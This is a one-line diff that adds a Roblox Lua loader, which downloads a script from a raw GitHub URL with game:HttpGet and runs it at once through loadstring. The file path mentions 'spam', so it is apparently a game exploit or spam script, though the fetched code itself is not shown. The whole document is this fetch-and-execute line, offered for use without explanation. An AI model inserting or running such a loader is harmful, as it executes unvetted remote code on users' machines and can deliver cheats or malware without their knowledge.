@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/beta-buddytime-spam6-rmuec0ewg173u0.lua"))()
